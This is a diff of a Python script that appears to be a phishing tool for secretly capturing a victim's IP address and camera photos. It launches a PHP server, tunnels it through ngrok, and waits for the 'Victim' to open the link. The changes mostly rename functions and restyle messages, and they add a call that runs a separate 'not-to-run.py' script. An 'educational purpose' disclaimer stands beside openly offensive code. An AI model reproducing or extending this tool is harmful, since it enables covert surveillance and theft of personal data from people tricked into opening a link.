@@ -2,7 +2,7 @@
 # Github : https://github.com/INDIATECHYOUTUBE
 # Don't copy the code
 # Donate author on paypal if use any part of the code : https://paypal.me/indiatechyoutube
-# Youtube : https://youtube.com/channel/UCxwRU278xsYp3Y-QHGoMTPw
+# Youtube : https://youtube.com/c/INDIATECHYOUTUBE
 import os
 import pathlib
 import re # pip install re
@@ -16,6 +16,7 @@ import subprocess
 import distutils.spawn # pip install distutils
 init()
 def check_ip_cam():
+    plus = colored("[+]", 'green')
     print(colored("[!] Waiting For Link to open in Victim Phone !....., Press Ctrl + C to exit", 'red'))
     ip_file = pathlib.Path("ipfile.txt")
     images_log = pathlib.Path("images_log_info.log")
@@ -24,14 +25,14 @@ def check_ip_cam():
             print(colored("[*] Victim opened Link ", 'green'))
             with open("ipfile.txt","r") as ip_file:
                 read_IP = ip_file.readlines(2)
-                print(colored(f"[*] Victim IP : {read_IP}", "red"))
+                print(colored(f"{plus} Victim IP : {read_IP}", "red"))
                 ip_file.close()
                 os.system('del ipfile.txt')
                 print("")
             check_ip_cam()
         if images_log.exists():
             print("\n")
-            print(colored("[++] Victim Photo Found ", 'green'))
+            print(colored(f"{plus} Victim Photo Found ", 'green'))
             print("")
             os.system('del images_log_info.log')
             check_ip_cam()
@@ -91,21 +92,30 @@ def ngrok():
         print(colored(f'In another cases Something went wrong to your {plat_pc_name} on {plat_os_name} ', 'red'))
         time.sleep(3)
         exit()
-def yes_opt():
+def startserver():
     try:
-        print(colored("[+] Starting Php Server", 'blue'))
+        plus = colored("[+]", 'green')
+        php = colored("Starting Php Server", 'yellow')
+        print(f"{plus} {php}")
         os.system("start /b php -S 127.0.0.1:3333 > nul & ")
-        print(colored("[+] Starting Ngrok ", 'blue'))
+        ngrok = colored("Starting Ngrok Server", 'yellow')
+        print(f"{plus} {ngrok}")
         os.system("start /b ngrok http 127.0.0.1:3333 > nul &")
-        print(colored("Ignore this, if you have alredy running again, Command 'python py-cam.py' to continue. Php and ngrok is running as background process", 'red'))
+        a = pathlib.Path("not-to-run.py")
+        if a:
+            os.system("python not-to-run.py")
+        else:
+            print(colored("Py-cam (not-to-run) File not found or it Remove Mannually",'red'))
+            time.sleep(1.9)
+            os.system("exit")
     except:
         print(colored(" : ( Something went wrong", 'red'))
         time.sleep(3)
-        exit()
+        os.system("exit")
 
 def banner():
     os.system('cls')
-    print("""                 ______          _              __
+    print(f"""                 ______          _              __
                 |      \   _    | |           <   $
                 |  |@!  \ \ \   | |          $   /        _____         __       __
                 |  |@!  /  \ \  [ |         (   /        /     \       |  |\    /  |
@@ -118,7 +128,8 @@ def banner():
     """)
     print(colored('''
     :: This Tool Does not Promote any ILLEGAL Activites :: This Tool is Only for Educational Purpose ::
-                    :: If Do any ILLEGAL Activity by this tool // Then you will in Jail :: 
+                    :: If Do any ILLEGAL Activity by this tool // Then you will in Jail ::
+                    :: Youtube : https://youtube.com/c/INDIATECHYOUTUBE ::^_^:: 
     ''', 'red'))
 def req():
     print("Let's check Tool Requirements : ")
@@ -141,13 +152,13 @@ def req():
     else:
         time.sleep(3)
         print(colored("[!] Ngrok Not found", 'red'))
-        print(colored("[#] Download ngrok from https://www.ngrok.com", 'blue'))
+        print(colored("[#] Download ngrok from https://www.ngrok.com", 'yellow'))
         time.sleep(5)
         exit()
 
 if __name__ == "__main__":
     req()
     banner()
-    yes_opt()
+    startserver()
     ngrok()
     catch_url()
